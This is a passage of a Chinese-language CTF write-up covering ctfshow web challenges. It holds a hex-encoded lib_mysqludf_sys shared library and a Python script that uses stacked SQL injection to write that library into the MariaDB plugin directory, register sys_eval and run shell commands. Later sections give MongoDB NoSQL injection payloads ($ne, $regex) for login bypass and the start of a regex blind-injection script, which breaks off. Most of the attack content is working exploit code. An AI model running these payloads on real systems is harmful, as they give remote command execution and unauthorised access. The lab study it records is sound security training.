D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>codes</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>),</span> <span class=mi>128</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>codes</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=nb>min</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>128</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>))])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 建临时表</span>
</span></span><span class=line><span class=cl><span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;create table temp(data longblob)&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 清空临时表</span>
</span></span><span class=line><span class=cl><span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;delete from temp&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 插入第一段数据</span>
</span></span><span class=line><span class=cl><span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;insert into temp(data) values (0x</span><span class=si>{}</span><span class=s1>)&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>codes</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 更新连接剩余数据</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>codes</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;update temp set data = concat(data,0x</span><span class=si>{}</span><span class=s1>)&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>codes</span><span class=p>[</span><span class=n>k</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 10.3.18-MariaDB</span>
</span></span><span class=line><span class=cl><span class=c1># 写入so文件</span>
</span></span><span class=line><span class=cl><span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;select data from temp into dumpfile &#39;/usr/lib/mariadb/plugin/udf.so</span><span class=se>\&#39;</span><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 引入自定义函数</span>
</span></span><span class=line><span class=cl><span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;create function sys_eval returns string soname &#39;udf.so</span><span class=se>\&#39;</span><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 命令执行，结果更新到界面</span>
</span></span><span class=line><span class=cl><span class=n>sql</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;update ctfshow_user set pass=(select sys_eval(&#39;cat /flag.her?&#39;))&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;0&#39;;</span><span class=si>{}</span><span class=s1>;-- A&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看结果</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s1>&#39;?page=1&amp;limit=10&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web249>web249</h2><p><code>$user = $memcache->get($id);</code>使用 Memcache 类的 get 方法从缓存中获取数据，$id 是传入的键，用于从缓存中获取与该键对应的值，当 <code>get()</code> 接收到一个数组时，它会尝试获取数组中所有元素对应的键。使用数组绕过</p><p><code>?id[]=flag</code></p><h2 id=web250>web250</h2><p><code>$regex</code> 是用于正则表达式匹配的操作符。</p><ul><li><code>$regex</code> 允许使用正则表达式进行模式匹配</li><li>语法：<code>{ 字段: { $regex: 模式 } }</code></li></ul><p><code>$ne</code> 是 MongoDB 和其他 NoSQL 数据库中的"不等于"(not equal)操作符。</p><ul><li><code>$ne</code> 用于查找字段值不等于指定值的文档</li><li>语法：<code>{ 字段: { $ne: 值 } }</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>bea56c10-9388-468e-9496-d42a8a42cdb1.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>31</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Google Chrome&#34;;v=&#34;135&#34;, &#34;Not-A.Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;135&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>https://bea56c10-9388-468e-9496-d42a8a42cdb1.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://bea56c10-9388-468e-9496-d42a8a42cdb1.challenge.ctf.show/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=0, i</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username[$ne]=1&amp;password[$ne]=1
</span></span></code></pre></td></tr></table></div></div><h2 id=web251>web251</h2><p><code>username=admin&amp;password[$ne]=anything</code>得到回显并不是flag，<code>username[$ne]=admin&amp;password[$ne]=anything</code>得到flag</p><h2 id=web252>web252</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username[$regex]=^[^admin].*$&amp;password[$ne]=1
</span></span><span class=line><span class=cl>username[$ne]=1&amp;password[$regex]=ctfshow{
</span></span><span class=line><span class=cl>username[$regex]=f_l_a_g&amp;password[$ne]=1
</span></span></code></pre></td></tr></table></div></div><p><code>[^admin]</code>是一个字符类的否定，表示匹配所有匹配任何<strong>不在</strong>括号内的字符，所以<code>^[^admin]</code>是匹配所有<strong>首字符不是</strong><code>a\d\m\i\n</code>的用户名。</p><h2 id=web253>web253</h2><p>正则遍历进行盲注，但是有个问题，我如果直接遍历的话容易给我搞到admin，所以我加了一个f，并且正则问题</p><p><code>f'^f{temp_target}.*$'</code>只匹配<code>f</code>开头的字符串，<code>f'f{temp_target}.*$'</code>匹配<code>f</code>在字符串任意位置的字符串，那为什么不能用第一种呢，因为我使用了另一个payload，<code>f'^[^admin]{temp_target}.*$'</code>，来测试发现其实username的正则应该是<code>ql_flag</code>，MongoDB中的正则表达式默认是<strong>子字符串匹配</strong>的，就是说只要有那个关键词的字符串都可以匹配，所以网上大家写的脚本即使只有<code>flag</code>也可以正常运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=n>table</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_uppercase</span><span class=o>+</span><span class=s1>&#39;_</span><span class=si>{}</span><span class=s1>-,&#39;</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://8d9e641e-652a-4212-8690-201e1a4fcd01.challenge.ctf.show/api/index.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
